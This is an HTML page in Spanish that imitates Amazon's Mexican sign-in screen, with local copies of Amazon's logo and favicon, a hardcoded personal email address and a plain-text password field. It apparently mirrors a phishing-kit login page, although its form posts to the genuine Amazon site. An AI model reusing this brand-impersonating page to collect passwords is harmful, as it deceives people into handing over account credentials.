<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirmar identidad</title>
    <link rel="icon" href="images/Amazon.ico" type="image/x-icon">
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    
    <div class="logo-container">
        <img src="images/amazon2.png" alt="Logo Amazon">
    </div>
    <div class="login-container">
        <form action="https://www.amazon.com.mx/" method="POST">
            <h2>Iniciar sesión</h2>
            <p class="email-display">albertocastro140702@gmail.com <a href="index.html">Cambiar</a></p>
            <div class="input-group">
                <label for="password">Contraseña</label>
                <input type="text" id="password" name="password" required>
                <a href="#" class="forgot-password">¿Olvidaste tu contraseña?</a>
            </div>
            <button type="submit">Iniciar sesión</button>
            <div class="checkanddetails">
                <div class="checkbox-group">
                    <input type="checkbox" id="remember-me" name="remember-me">
                    <label for="remember-me">Recuérdame</label>
                </div>
                <!--
                <details class="more-details">
                    <summary class="summary">Detalles</summary>
                    <p>La información de inicio de sesión se guardará en este dispositivo.</p>
                </details>
                -->
            </div>
            
            <div class="info-links">
                <a href="cond_uso.html">Condiciones de uso</a> | <a href="privacidad.html">Aviso de Privacidad</a> | <a href="#">Ayuda</a>
            </div>
        </form>
    </div>
</body>
</html>
